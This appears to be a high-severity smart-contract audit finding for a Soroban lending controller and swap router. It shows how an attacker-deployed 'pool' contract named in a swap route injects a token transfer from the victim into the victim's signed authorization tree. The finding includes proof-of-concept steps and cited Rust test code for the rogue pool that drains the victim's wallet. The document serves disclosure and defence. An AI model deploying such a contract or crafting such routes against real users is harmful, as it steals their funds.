### Title
High: Arbitrary route contracts can inject unauthorized token transfers into a victim’s signed strategy authorization - (File: contracts/controller/src/strategies/swap.rs)

### Summary

Severity: High. `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply` accept caller-supplied route bytes and execute them through the configured router. A route can name an attacker-controlled venue contract that calls `token.transfer(victim, attacker, amount)` during the strategy call. Soroban records that nested transfer as a child of the victim’s signed authorization tree, so simulation can produce a poisoned tree whose signature authorizes both the intended strategy and theft of unrelated wallet tokens.

### Finding Description

`process_swap_collateral` authenticates the caller and verifies account ownership, but forwards the caller-controlled `swap` bytes into `withdraw_and_swap_from_supply`. [1](#0-0) [2](#0-1) 

The controller limits its own router authority to one exact `token_in.transfer(controller, router, amount_in)` invocation and checks only the controller’s input spend and positive output delta. [3](#0-2) [4](#0-3) 

Those checks do not restrict which contract address the route uses as a hop pool. The router decodes the pool address from the route’s address registry and dispatches the corresponding venue call. [5](#0-4)  For an Aquarius hop, the router invokes the route-supplied `pool.swap`; contract code below the victim-authorized controller call can therefore request authorization from the victim for an unrelated token transfer. [6](#0-5) 

The repository’s authorization test demonstrates the resulting behavior: recording mode attaches a malicious `wallet_token.transfer(alice, attacker, balance)` as a child of Alice’s `swap_collateral` authorization, and enforcing mode executes it when that poisoned tree is signed. [7](#0-6) [8](#0-7) 

### Impact Explanation

A victim who signs the simulated authorization tree loses unrelated wallet tokens in addition to performing the intended collateral or debt strategy. The strategy itself can remain economically valid and pass the controller’s measured-output and solvency checks, so the victim receives the expected swap while the attacker receives the victim’s unrelated token balance. This is theft of user funds. [9](#0-8) [10](#0-9) 

The strongest reachable entrypoint is `swap_collateral(caller, account_id, current, amount, new, swap)`, where `swap` encodes the malicious route. [11](#0-10)  The same route boundary is also reached by `swap_debt`, `repay_debt_with_collateral`, `multiply`, and `multiply`’s third-asset `convert_swap`. [12](#0-11) [13](#0-12) [14](#0-13) 

### Likelihood Explanation

An unprivileged attacker can deploy the malicious venue and construct the route without privileged access. Exploitation requires the victim to submit a strategy using that route and sign the simulation-generated authorization tree containing the extra transfer; this is the same practical trust failure as maliciously injected transaction content. [15](#0-14) [16](#0-15) 

The protocol’s own threat model acknowledges that route-selected third-party code can place such a transfer below the caller’s authorization and that neither the route minimum nor final risk checks bound the resulting wallet loss. [17](#0-16) 

### Recommendation

Do not permit arbitrary venue contract addresses in routes used by authenticated position strategies. Bind each route hop to a governance-approved venue/pool registry, or otherwise constrain dispatch to protocol-approved immutable venue contracts. Independently, wallets and clients should decode the route and reject any authorization tree containing children beyond the expected input transfer; this mitigates user signing risk but does not replace on-chain venue admission control.

### Proof of Concept

1. Alice owns a lending account with listed USDC collateral and holds an unrelated `wallet_token`; the attacker deploys a pool-shaped contract whose `swap` calls `wallet_token.transfer(alice, attacker, alice_balance)`. [18](#0-17) 
2. The attacker supplies a `swap` payload whose hop pool is that contract, with listed USDC as input and listed ETH as output. [15](#0-14) 
3. Alice invokes `swap_collateral(alice, account_id, usdc_hub_asset, amount, eth_hub_asset, malicious_swap)`. The controller withdraws collateral and invokes the configured router, which invokes the attacker-controlled pool. [19](#0-18) 
4. Simulation records the rogue wallet-token transfer as a child authorization of Alice’s `swap_collateral` invocation; the test records the exact token transfer and confirms Alice’s fair ETH output. [7](#0-6) 
5. If Alice signs that simulated tree, enforcing mode accepts it: her unrelated `wallet_token` balance decreases from `77_770_000_000` to zero and the attacker receives it, while the collateral swap succeeds. [8](#0-7)

### Citations

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-47)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-76)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );

    let deposit_assets = vec![env, (new.clone(), swapped_amount)];
    supply::process_deposit(
        env,
        &env.current_contract_address(),
        &mut account,
        &deposit_assets,
        &mut cache,
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L151-165)
```rust
    match op.opcode {
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
```

**File:** contracts/swap-aggregator/src/venues/aquarius/pool.rs (L25-34)
```rust
    authorize_token_transfer(env, token_in, router, pool, amount_in);
    let args: Vec<Val> = vec![
        env,
        router.into_val(env),
        in_idx.into_val(env),
        out_idx.into_val(env),
        to_u128(env, amount_in).into_val(env),
        0_u128.into_val(env),
    ];
    let _: u128 = env.invoke_contract(pool, &symbol_short!("swap"), args);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L166-181)
```rust
    /// Enforcing mode: Alice signs `swap_collateral` with exactly `children` beneath it.
    fn try_swap_with_signed_tree(
        &self,
        route: &Bytes,
        children: &[MockAuthInvoke],
    ) -> Result<(), soroban_sdk::Error> {
        let root = MockAuthInvoke {
            contract: &self.t.controller,
            fn_name: "swap_collateral",
            args: self.swap_args(route),
            sub_invokes: children,
        };
        self.t.env.mock_auths(&[MockAuth {
            address: &self.alice,
            invoke: &root,
        }]);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** contracts/controller/src/lib.rs (L280-302)
```rust
    /// Withdraws `amount` of `current`, converts it to `new` via `swap` and
    /// redeposits the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-72)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/repay_debt_with_collateral.rs (L108-117)
```rust
    let debt_available = withdraw_and_swap_from_supply(
        env,
        account,
        cache,
        caller,
        collateral,
        collateral_amount,
        &debt.asset,
        swap,
        events::PositionAction::RpColWd,
```

**File:** contracts/controller/src/strategies/multiply.rs (L187-195)
```rust
        let collateral_amount = swap_tokens(
            env,
            caller,
            &payment.asset,
            received,
            &collateral.asset,
            convert,
        );
        (collateral_amount, 0)
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
